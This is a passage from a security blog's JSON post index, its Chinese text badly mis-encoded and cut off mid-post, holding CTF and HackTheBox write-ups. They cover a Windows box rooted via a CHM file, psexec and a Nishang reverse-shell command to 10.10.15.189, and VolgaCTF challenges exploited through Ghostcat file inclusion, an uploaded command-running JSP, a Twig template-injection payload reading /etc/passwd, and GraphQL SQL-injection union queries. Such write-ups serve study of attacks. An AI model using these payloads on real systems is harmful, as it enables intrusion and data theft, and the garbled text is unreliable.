wgetä¸Šä¼ æ–‡ä»¶åˆ°docsæ–‡ä»¶å¤¹ä¸‹ 1wget http://10.10.15.189/test.chm -O exp.chm å¾ˆå¿«å°±èƒ½æ”¶åˆ°è¯·æ±‚è¿™æ˜¯ä¸€ä¸²ç®¡ç†å‘˜å¯†ç çš„hash.åˆ°ç½‘ç«™ä¸Šè§£ç å¯å¾—ç®¡ç†å‘˜å¯†ç butterfly!#1. ç„¶åç™»å°è¯•ç™»é™†ã€‚ç”±äºå¼€æ”¾äº†445ç«¯å£ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨smbæœåŠ¡å¯ä»¥ç›´æ¥ç™»å½•ã€‚å½“ç„¶æˆ‘æ²¡æœ‰èµ·smbæœåŠ¡ï¼Œä½¿ç”¨ä¸‹é¢githubä¸Šçš„pythonè„šæœ¬å³å¯æ›¿ä»£ã€‚ 123git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket pip install .python psexec.py Administrator@10.10.10.151 æˆåŠŸæ‹¿åˆ°rootshell. å½“ç„¶è¿˜æœ‰ç±»ä¼¼å‰é¢çš„ç›´æ¥åå¼¹rootshellçš„æ–¹æ³•ã€‚å› ä¸ºchmæ–‡ä»¶ç”šè‡³å¯ä»¥æ’å…¥powershellå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”Ÿæˆåå¼¹shellçš„html.è¿™é‡Œç›´æ¥å€Ÿç”¨çœ‹åˆ°çš„dalaoçš„chmã€‚æˆ–è€…ä½¿ç”¨powershellå‘½ä»¤ç”Ÿæˆpayloadhttps://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1 1Out-CHM â€“Payload \"C:windows\\temp\\exp.exe 10.10.15.189 6666 -e powershell.exe\" â€“HHCPath â€œC:\\Program Files (x86)\\HTML Help Workshopâ€ è¿™æ ·å°±èƒ½ç›´æ¥åœ¨administratoræ£€æŸ¥æ—¶åå¼¹åˆ°shell. å°ç»“è¿™æ¬¡windowsé¶æœºçš„ä½“éªŒè¿˜ç®—ä¸é”™ã€‚å› ä¸ºä¸ç†Ÿæ‚‰çš„åŸå› æ¥è§¦äº†ä¸å°‘æ–°çŸ¥è¯†ã€‚æœ‰å¾ˆå¤šç»†èŠ‚è¿˜æ²¡å¼„æ˜ç™½ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘windowsé¶æœºæ–°çŸ¥è¯†ã€‚çš„ç¡®ï¼ŒCTFer ä¸èƒ½æ€»æ˜¯å¾…åœ¨èˆ’é€‚åŒºã€‚å›½é™…èµ›ä¹Ÿå¥½ï¼Œhtbé¶æœºæ¸—é€ä¹Ÿå¥½ï¼Œéƒ½æ˜¯æ¥è§¦éå›½å†…æ¸—é€çŸ¥è¯†çš„å¤§å¥½é€”å¾„ã€‚æ¯•ç«Ÿä¹Ÿæ‰“äº†ä¸€æ®µæ—¶é—´æ¯”èµ›äº†ï¼Œå›½å†…çš„æ¯”èµ›é™¤äº†å¤§å‹æ¯”èµ›èƒ½æœ‰å¾ˆå¤šæ–°å§¿åŠ¿ä»¥åŠæ–°æƒ³æ³•å­¦ä»¥å¤–ï¼Œå…¶ä»–çš„å‡ºé¢˜æ€è·¯æˆ–è€…èµ›äº‹æ“ä½œéƒ½æ˜¯è€ç”Ÿå¸¸è°ˆï¼Œæ‹˜æ³¥äºphpæˆ–è€…ä¸ªåˆ«trickçš„æ³¥æ½­ä¸­ã€‚è¿™å‡ å¤©å°è¯•äº†javaé¢˜ï¼Œwindowsé¢˜ï¼Œéƒ½ç®—æ˜¯ä¸€ç§çªç ´å¸¸è§„çš„å°è¯•å§ã€‚å¸Œæœ›è‡ªå·±ä¹Ÿèƒ½æˆä¸ºæœ‰æƒ³æ³•çš„CTFerã€‚è€Œä¸æ˜¯ä¸€ä¸ªå•çº¯çš„CTFèµ›æ£.","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"windows","slug":"windows","permalink":"https://www.bycsec.top/tags/windows/"}]},{"title":"VolgaCTF2020Qualifierå¤ç°","slug":"VolgaCTF2020Qualifierå¤ç°","date":"2020-03-30T13:47:25.000Z","updated":"2021-02-18T05:09:52.269Z","comments":true,"path":"2020/03/30/VolgaCTF2020Qualifierå¤ç°/","link":"","permalink":"https://www.bycsec.top/2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/","excerpt":"æ¯”èµ›æ²¡æœ‰æ€ä¹ˆè®¤çœŸæ‰“ï¼Œä½†æ˜¯æ¯•ç«Ÿé¢˜è¿˜æ˜¯çœ‹äº†çš„ã€‚é™¤äº†å¹½çµçŒ«ä»¥å¤–çš„é¢˜ä¹Ÿæ˜¯å¾ˆæœ‰ä»·å€¼çš„ï¼Œå¥½å¥½å­¦ä¹ ä¸€æ³¢ã€‚ NetCorpè¿™ä¸ªå‘¨æœ«æœ€å¤§çš„æ”¶è·å°±æ˜¯åšäº†å‡ é“javaé¢˜ï¼Œå¯¹javaé¢˜çš„ç›¸å…³å¥—è·¯æœ‰äº†ä¸€å®šäº†è§£ã€‚æ¯”å¦‚æ­¤é¢˜ï¼Œå¼€å§‹ä¸Šæ¥é¡µé¢å¹¶æ— ä»»ä½•æœ‰ç”¨ä¿¡æ¯ã€‚å”¯ä¸€èƒ½åšçš„ä»è·¯ç”±ä¸‹æ‰‹ï¼Œè¿™é‡Œä¸ä½¿ç”¨è·¯å¾„çˆ†ç ´å·¥å…·çš„è¯ï¼Œå¯ä»¥é€šè¿‡æ„é€ ä¸€äº›é”™è¯¯è·¯å¾„æ¥å°è¯•çˆ†ç‰ˆæœ¬ä»¥åŠçˆ†æœåŠ¡ã€‚è¿™é‡Œåœ¨bpé€šè¿‡æ„é€ çˆ†å‡ºäº†tomcatæœåŠ¡çš„ç›¸å…³ä¿¡æ¯ã€‚","text":"æ¯”èµ›æ²¡æœ‰æ€ä¹ˆè®¤çœŸæ‰“ï¼Œä½†æ˜¯æ¯•ç«Ÿé¢˜è¿˜æ˜¯çœ‹äº†çš„ã€‚é™¤äº†å¹½çµçŒ«ä»¥å¤–çš„é¢˜ä¹Ÿæ˜¯å¾ˆæœ‰ä»·å€¼çš„ï¼Œå¥½å¥½å­¦ä¹ ä¸€æ³¢ã€‚ NetCorpè¿™ä¸ªå‘¨æœ«æœ€å¤§çš„æ”¶è·å°±æ˜¯åšäº†å‡ é“javaé¢˜ï¼Œå¯¹javaé¢˜çš„ç›¸å…³å¥—è·¯æœ‰äº†ä¸€å®šäº†è§£ã€‚æ¯”å¦‚æ­¤é¢˜ï¼Œå¼€å§‹ä¸Šæ¥é¡µé¢å¹¶æ— ä»»ä½•æœ‰ç”¨ä¿¡æ¯ã€‚å”¯ä¸€èƒ½åšçš„ä»è·¯ç”±ä¸‹æ‰‹ï¼Œè¿™é‡Œä¸ä½¿ç”¨è·¯å¾„çˆ†ç ´å·¥å…·çš„è¯ï¼Œå¯ä»¥é€šè¿‡æ„é€ ä¸€äº›é”™è¯¯è·¯å¾„æ¥å°è¯•çˆ†ç‰ˆæœ¬ä»¥åŠçˆ†æœåŠ¡ã€‚è¿™é‡Œåœ¨bpé€šè¿‡æ„é€ çˆ†å‡ºäº†tomcatæœåŠ¡çš„ç›¸å…³ä¿¡æ¯ã€‚ è€Œä¸”è®¿é—®/docsï¼Œå¾—åˆ°apachetomcatä¿¡æ¯,æ˜¯9.0.24ç‰ˆæœ¬ã€‚åŸºæœ¬ç¡®å®šæ˜¯é“javaé¢˜ï¼Œ æ¥ä¸‹æ¥å»æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå‘ç°äº†è¿™æ ·ä¸€ä¸ªæ¼æ´ï¼šCVE-2020-1938 å³tomcatçš„ghostcatæ¼æ´å€¼å¾—ä¸€æçš„æ˜¯,ghostcatæ¼æ´æ˜¯ç”±é•¿äº­çˆ†å‡ºæ¥çš„æ´ï¼ŒGhostCat ä¸»è¦æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–å’ŒåŒ…å«æ¼æ´å½±å“èŒƒå›´å¾ˆå¹¿ï¼Œå‡ ä¹å›Šæ‹¬äº†6-9ç‰ˆæœ¬ã€‚æˆ‘ä»¬åˆçŸ¥é“ï¼Œæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«=RCE.å› æ­¤å°è¯•åˆ©ç”¨ç›¸å…³å·¥å…·å…ˆè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œçœ‹çœ‹æœ‰æ— æ”¶è·ã€‚å¼€å§‹ç”¨çš„expæ˜¯è¿™ä¸ªhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi,ä½†æ˜¯åªèƒ½è¯»æ–‡ä»¶ä¸å¯æ‰§è¡Œå‘½ä»¤ã€‚å› æ­¤ä½œç½¢ã€‚æˆ‘åæ¥ä½¿ç”¨çš„expæ¥è‡ªhttps://github.com/00theway/Ghostcat-CNVD-2020-10487è¿™ä¸ªexpä¸ä»…å¯ä»¥æ–‡ä»¶è¯»å–è¿˜å¯ä»¥åŒ…å«ï¼Œå› æ­¤æ›´é€‚åˆ é¦–å…ˆ,å¯¹tomcatæœåŠ¡å¿…è¯»çš„æ–‡ä»¶å°±æ˜¯WEB-INF/web.xmlå°è¯•è¯»å–python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /WEB-INF/web.xml read 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\" &gt;&lt;web-app&gt; &lt;display-name&gt;NetCorp&lt;/display-name&gt; &lt;servlet&gt; &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt; &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt; &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt; &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt; &lt;display-name&gt;ServeComplaint&lt;/display-name&gt; &lt;description&gt;Complaint info&lt;/description&gt; &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt; &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/404.html&lt;/location&gt; &lt;/error-page&gt; &lt;/web-app&gt; å¯ä»¥çœ‹åˆ°é™¤äº†404.htmlè¿™æ ·çš„é¡µé¢è¿˜æœ‰ä¸¤ä¸ªç±»çš„ä¿¡æ¯ã€‚è¿™é‡Œå¯ä»¥æ¨æ–­classæ–‡ä»¶çš„è·¯å¾„,é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç æˆ‘æŒ‰ç…§roarctf easyjavaçš„ç»éªŒæ„é€ è·¯å¾„,è·¯å¾„å‹‰å¼ºç®—ç†è§£ï¼Œå¥½æ­¹æˆ‘ä¹Ÿæ˜¯javaå…¥é—¨ç¼–ç¨‹çš„â€¦WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.classï¼Œå¦ä¸€ä¸ªåŒç†ã€‚ 12python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeComplaintServlet.class read -o complaint.classpython3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeScreenshotServlet.class read -o screenshoot.class åç¼–è¯‘åå¾—åˆ°ä»¥ä¸‹æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name: ServeComplaintServlet.javapackage ru.volgactf.netcorp;import java.io.IOException;import java.io.PrintStream;import javax.servlet.ServletConfig;import javax.servlet.ServletException;import javax.servlet.http.*;public class ServeComplaintServlet extends HttpServlet&#123; public ServeComplaintServlet() &#123; System.out.println(\"ServeScreenshotServlet Constructor called!\"); &#125; public void init(ServletConfig config) throws ServletException &#123; System.out.println(\"ServeScreenshotServlet \\\"Init\\\" method called\"); &#125; public void destroy() &#123; System.out.println(\"ServeScreenshotServlet \\\"Destroy\\\" method called\"); &#125; protected void doGet(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse) throws ServletException, IOException &#123; &#125; protected void doPost(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse) throws ServletException, IOException &#123; &#125; private static final long serialVersionUID = 1L; private static final String SAVE_DIR = \"uploads\";&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name: ServeScreenshotServlet.javapackage ru.volgactf.netcorp;import java.io.*;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Collection;import java.util.Iterator;import javax.servlet.*;import javax.servlet.http.*;public class ServeScreenshotServlet extends HttpServlet&#123; public ServeScreenshotServlet() &#123; System.out.println(\"ServeScreenshotServlet Constructor called!\"); &#125; public void init(ServletConfig config) throws ServletException &#123; System.out.println(\"ServeScreenshotServlet \\\"Init\\\" method called\"); &#125; public void destroy() &#123; System.out.println(\"ServeScreenshotServlet \\\"Destroy\\\" method called\"); &#125; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String appPath = request.getServletContext().getRealPath(\"\"); String savePath = (new StringBuilder()).append(appPath).append(\"uploads\").toString(); File fileSaveDir = new File(savePath); if(!fileSaveDir.exists()) fileSaveDir.mkdir(); String submut = request.getParameter(\"submit\"); if(submut != null) if(submut.equals(\"true\")); PrintWriter out = request.getParts().iterator(); do &#123; if(!out.hasNext()) break; Part part = (Part)out.next(); String fileName = extractFileName(part); fileName = (new File(fileName)).getName(); String hashedFileName = generateFileName(fileName); String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString(); if(!path.equals(\"Error\")) part.write(path); &#125; while(true); out = response.getWriter(); response.setContentType(\"application/json\"); response.setCharacterEncoding(\"UTF-8\"); out.print(String.format(\"&#123;'success':'%s'&#125;\", new Object[] &#123; \"true\" &#125;)); out.flush(); &#125; private String generateFileName(String fileName) &#123; String s2; StringBuilder sb; MessageDigest md = MessageDigest.getInstance(\"MD5\"); md.update(fileName.getBytes()); byte digest[] = md.digest(); s2 = (new BigInteger(1, digest)).toString(16); sb = new StringBuilder(32); int i = 0; for(int count = 32 - s2.length(); i &lt; count; i++) sb.append(\"0\"); return sb.append(s2).toString(); NoSuchAlgorithmException e; e; e.printStackTrace(); return \"Error\"; &#125; private String extractFileName(Part part) &#123; String contentDisp = part.getHeader(\"content-disposition\"); String items[] = contentDisp.split(\";\"); String as[] = items; int i = as.length; for(int j = 0; j &lt; i; j++) &#123; String s = as[j]; if(s.trim().startsWith(\"filename\")) return s.substring(s.indexOf(\"=\") + 2, s.length() - 1); &#125; return \"\"; &#125; private static final String SAVE_DIR = \"uploads\";&#125; ä¸»è¦å†…å®¹åœ¨äºServeScreenshotServletè¿™ä¸ªç±»ã€‚æˆ‘ä»¬å¾—åˆ°äº†ä¸Šä¼ æ–‡ä»¶çš„å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡ä¸Šä¼ +åŒ…å«æ„é€ RCEäº†ã€‚ç®€å•è¯»ä¸‹æºç ï¼Œå…¶å®å°±æ˜¯æŒ‡ä¸Šä¼ æ–‡ä»¶ä¼šä¼ åˆ°/uploadä¸‹ï¼ŒåŒæ—¶æ–‡ä»¶åå˜ä¸ºä¸Šä¼ æ–‡ä»¶åçš„md5å€¼ç›´æ¥ä½¿ç”¨curlä¼ æ–‡ä»¶curl -vv -F &quot;data=@myexp.jsp&quot; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshotmyexp.jsp 12345678910111213&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% out.println(\"Executing command\");Process p = Runtime.getRuntime().exec(\"ls\");OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;%&gt; æ‰§è¡Œpython3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /uploads/78e1e40f057500a0dd0209effb7514d3 eval æ³¨æ„åˆ°flag.txtçš„å­˜åœ¨,é‚£ä¹ˆç›´è§£æ›´æ”¹å‘½ä»¤ä¸Šä¼ åå†æ¬¡æ‰§è¡Œå³å¯ Newsletterè¿™é¢˜ç½‘ä¸Šæ‰¾ä¸åˆ°å…è´¹çš„èƒ½æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ï¼Œåº”è¯¥æ˜¯è¦ä¸ªSMTPçš„ã€‚æ²¡åŠæ³•åªèƒ½å­¦å­¦Twigæ‰“sstiçš„ç”¨æ³•äº†ã€‚é¢˜ç›®é¦–å…ˆç»™å‡ºçœ‹æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace App\\Controller;use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;use Symfony\\Component\\HttpFoundation\\Response;use Symfony\\Component\\HttpFoundation\\Request;use Symfony\\Component\\Mailer\\MailerInterface;use Symfony\\Component\\Mime\\Email;class MainController extends AbstractController&#123; public function index(Request $request) &#123; return $this-&gt;render('main.twig'); &#125; public function subscribe(Request $request, MailerInterface $mailer) &#123; $msg = ''; $email = filter_var($request-&gt;request-&gt;get('email', ''), FILTER_VALIDATE_EMAIL); if($email !== FALSE) &#123; $name = substr($email, 0, strpos($email, '@')); $content = $this-&gt;get('twig')-&gt;createTemplate( \"&lt;p&gt;Hello $&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;\" )-&gt;render(); $mail = (new Email())-&gt;from('newsletter@newsletter.q.2020.volgactf.ru')-&gt;to($email)-&gt;subject('VolgaCTF Newsletter')-&gt;html($content); $mailer-&gt;send($mail); $msg = 'Success'; &#125; else &#123; $msg = 'Invalid email'; &#125; return $this-&gt;render('main.twig', ['msg' =&gt; $msg]); &#125; public function source() &#123; return new Response('&lt;pre&gt;'.htmlspecialchars(file_get_contents(__FILE__)).'&lt;/pre&gt;'); &#125;&#125; é¦–å…ˆä¸ç”¨è¯´ï¼Œ${name}è¿™é‡Œå­˜åœ¨sstiçš„ã€‚åŒæ—¶ç¡®è®¤æ˜¯twigæ¨¡æ¿çš„ã€‚$email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);è¿™å¥è¿‡æ»¤å¾ˆå¥½ç»•ï¼Œåªéœ€è¦6@domain.tldå°±å¯ä»¥åœ¨æ”¶æ¸…æ±‚çš„åœ°æ–¹çœ‹åˆ°sstiçš„æ•ˆæœäº†ã€‚flagåœ¨etc/passwdä¸­payload: 1&quot;&#123;&#123;[&#39;cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;&quot;@y å› ä¸ºæ²¡æ³•äº²è‡ªåŠ¨æ‰‹æ‰€ä»¥åªå¥½æ¬è¿payloadäº†ï¼Œæƒ­æ„§â€¦ Libraryåœ¨æ³¨å†Œæ—¶å¯ä»¥æŠ“åŒ…å‘ç°/apiçš„è·¯ç”± æ ¹æ®ä¼ è¾“åŠè¿”å›å½¢å¼ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ˜¯GrpahQLçš„apiæ¥å£,åŒæ—¶ä¹Ÿæœ‰ä¸ªç»å…¸çš„åˆ©ç”¨ï¼Œå°±æ˜¯ä¼ {__schema{types{name}}},å¯ä»¥é€šè¿‡__schemaæŸ¥è¯¢æ‰€æœ‰å¯ç”¨å¯¹è±¡ï¼šå°è¯•ç›´æ¥è®¿é—®æ— æœï¼Œpostä¼ å€¼{&quot;query&quot;:&quot;{ __schema { types { name } } }&quot;}(è¿™é‡Œè¦ç¨å¾®æ ¹æ®ä¹‹å‰ä¼ å€¼çš„æ–¹å¼æ„é€ ä¸€ä¸‹) 1&#123;\"data\":&#123;\"__schema\":&#123;\"types\":[&#123;\"name\":\"Query\"&#125;,&#123;\"name\":\"String\"&#125;,&#123;\"name\":\"LoginUser\"&#125;,&#123;\"name\":\"LoginResponse\"&#125;,&#123;\"name\":\"UserFilter\"&#125;,&#123;\"name\":\"User\"&#125;,&#123;\"name\":\"Book\"&#125;,&#123;\"name\":\"Mutation\"&#125;,&#123;\"name\":\"RegisterUser\"&#125;,&#123;\"name\":\"__Schema\"&#125;,&#123;\"name\":\"__Type\"&#125;,&#123;\"name\":\"__TypeKind\"&#125;,&#123;\"name\":\"Boolean\"&#125;,&#123;\"name\":\"__Field\"&#125;,&#123;\"name\":\"__InputValue\"&#125;,&#123;\"name\":\"__EnumValue\"&#125;,&#123;\"name\":\"__Directive\"&#125;,&#123;\"name\":\"__DirectiveLocation\"&#125;]&#125;&#125;&#125; ä½¿ç”¨å¦‚ä¸‹payloadå¯ä»¥ä¸€ä¸ªä¸ªçš„çˆ†å‡ºæˆ‘ä»¬å¯èƒ½å¯ä»¥åˆ©ç”¨çš„schemaçš„ä¿¡æ¯{&quot;query&quot;:&quot;{ __type(name: \\&quot;User\\&quot;) { name fields { name type { name kind }}}}&quot;} 1&#123;\"data\":&#123;\"__type\":&#123;\"name\":\"User\",\"fields\":[&#123;\"name\":\"login\",\"type\":&#123;\"name\":\"String\",\"kind\":\"SCALAR\"&#125;&#125;,&#123;\"name\":\"name\",\"type\":&#123;\"name\":\"String\",\"kind\":\"SCALAR\"&#125;&#125;,&#123;\"name\":\"email\",\"type\":&#123;\"name\":\"String\",\"kind\":\"SCALAR\"&#125;&#125;]&#125;&#125;&#125; è¿™å°±å‘Šè¯‰æˆ‘ä»¬ï¼ŒUser objectæœ‰ä¸‰ä¸ªField.login, name ,email.åŒç†æˆ‘ä»¬çˆ†ä¸‹å…¶ä»–çš„,æ¯”å¦‚é‡ç‚¹å…³æ³¨çš„Queryå›æ˜¾ï¼š 1&#123;&quot;data&quot;:&#123;&quot;__type&quot;:&#123;&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[&#123;&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;]&#125;&#125;&#125; å‘ç°ä¸€ä¸ªtestGetUsersByFilter,ä¼¼ä¹å¾ˆæœ‰æ„æ€ã€‚ä¹Ÿè®¸å®ƒå¯¹å¯æ³¨çš„ç‚¹è¿›è¡Œäº†è¿‡æ»¤,ä½†è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚äºæ˜¯æˆ‘ä»¬è¿›è¡ŒåŸºæœ¬çš„æŸ¥è¯¢ã€‚æ­¤æ—¶ç›®æ ‡åº”è¯¥æ˜¯sqlæ³¨å…¥ï¼Œå¯»æ‰¾å¯æ³¨ç‚¹ã€‚ 1&#123;\"query\":\"query testGetUsersByFilter($input: UserFilter) &#123;\\n testGetUsersByFilter(filter: $input) &#123;\\n login email name \\n &#125;\\n&#125;\\n\",\"variables\":&#123;\"input\":&#123;\"login\":\"test\",\"email\":\"test\",\"name\":\"test\"&#125;&#125;&#125; æ„é€ è¿™æ ·ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚æ­¤æ—¶æˆ‘ä»¬éœ€è¦é€šè¿‡æ§åˆ¶login email,nameçš„å€¼æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥ 1&#123;\"query\":\"query testGetUsersByFilter($input: UserFilter) &#123;\\n testGetUsersByFilter(filter: $input) &#123;\\n login email name \\n &#125;\\n&#125;\\n\",\"variables\":&#123;\"input\":&#123;\"login\":\"'\",\"email\":\"1231321\",\"name\":\"3213\"&#125;&#125;&#125; å½“å°è¯•sqlæ³¨å…¥å¸¸è§çš„å•å¼•å·æ—¶ï¼Œå‘ç°è¿”å›çš„ç»“æœå¯¹åº”çš„loginå±…ç„¶æ˜¯ç©ºçš„ã€‚æ‰€ä»¥çœ‹æ¥å•å¼•å·è¢«è¿‡æ»¤äº†ã€‚ä½†è¿™å¹¶ä¸æ˜¯ä»€ä¹ˆé—®é¢˜ã€‚å› ä¸ºé€ƒé€¸å•å¼•å·ä¹Ÿæ˜¯ä¸ªè€ƒçƒ‚çš„trickäº†ã€‚ å°†æˆ‘ä»¬ä¼ å‚éƒ¨åˆ†inputçš„å€¼æ”¹ä¸ºï¼š{&quot;login&quot;:&quot;test\\\\&quot;,&quot;name&quot;:&quot; union select * from users -- &quot;}å‘ç°å°†è¿”å›æ‰€æœ‰ç”¨æˆ·åã€‚è‡³æ­¤sqlæ³¨å…¥å·²ç»ç¡®è®¤å¯æ³¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ–æ˜ä¿¡æ¯äº†ã€‚å…ˆorder by æµ‹å­—æ®µæ•°ï¼Œå‘ç°æ˜¯6ä¸ª ç„¶åæ‰§è¡ŒæŸ¥è¯¢ï¼Œå‘ç°å›æ˜¾å­—æ®µæ˜¯2,6,5union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()#å‘ç°flagè¡¨,flagåˆ—ï¼ŒæŸ¥è¯¢å³å¯","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"WUSTCTF&MRCTFéƒ¨åˆ†webé¢˜è§£","slug":"WUSTCTF&MRCTFéƒ¨åˆ†webé¢˜è§£","date":"2020-03-29T01:42:17.000Z","updated":"2021-02-18T05:09:55.641Z","comments":true,"path":"2020/03/29/WUSTCTF&MRCTFéƒ¨åˆ†webé¢˜è§£/","link":"","permalink":"https://www.bycsec.top/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/","excerpt":"è¿™å‘¨æœ«é¡ºæ‰‹æ‰“äº†ä¸‹ä¸¤ä¸ªæ–°ç”Ÿèµ›ã€‚æœ¬æ¥ä¸æƒ³å†™wpçš„,ä½†æ˜¯æƒ³åˆ°ä¸Šå‘¨BJDæ¯”èµ›çš„wpä¹Ÿæ²¡å†™å°±æƒ³ç€è¿˜æ˜¯è¡¥ç€å§ã€‚ï¼ˆä¸Šå‘¨BJDä¸å†™æ˜¯å› ä¸ºå¯¹æ¯”èµ›é¢˜ç›®å¿ƒé‡Œæœ‰æ„è§ï¼Œè¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œè„‘æ´è·Ÿå¥—å¨ƒé¢˜æŠŠä¸€å †è€æ‰‹éƒ½æ•´å¾—ä¸èˆ’æœã€‚å½“æ—¶å·®ä¸€é“ASP.NET,å› ä¸ºysoserialçš„gadgetç”¨çš„ä¸å¯¹å°±ä¸€ç›´å‡ºä¸äº†ç»“æœï¼Œç›´æ¥å¿ƒæ€æå´©ï¼‰æ‰€ä»¥è¿™æ¬¡æŠŠè¿™ä¸¤ä¸ªæ–°ç”Ÿèµ›é¢˜ç›®å†™å†™ã€‚å…·ä½“åªå¤§è‡´è®²ä¸‹æ€è·¯å§","text":"è¿™å‘¨æœ«é¡ºæ‰‹æ‰“äº†ä¸‹ä¸¤ä¸ªæ–°ç”Ÿèµ›ã€‚æœ¬æ¥ä¸æƒ³å†™wpçš„,ä½†æ˜¯æƒ³åˆ°ä¸Šå‘¨BJDæ¯”èµ›çš„wpä¹Ÿæ²¡å†™å°±æƒ³ç€è¿˜æ˜¯è¡¥ç€å§ã€‚ï¼ˆä¸Šå‘¨BJDä¸å†™æ˜¯å› 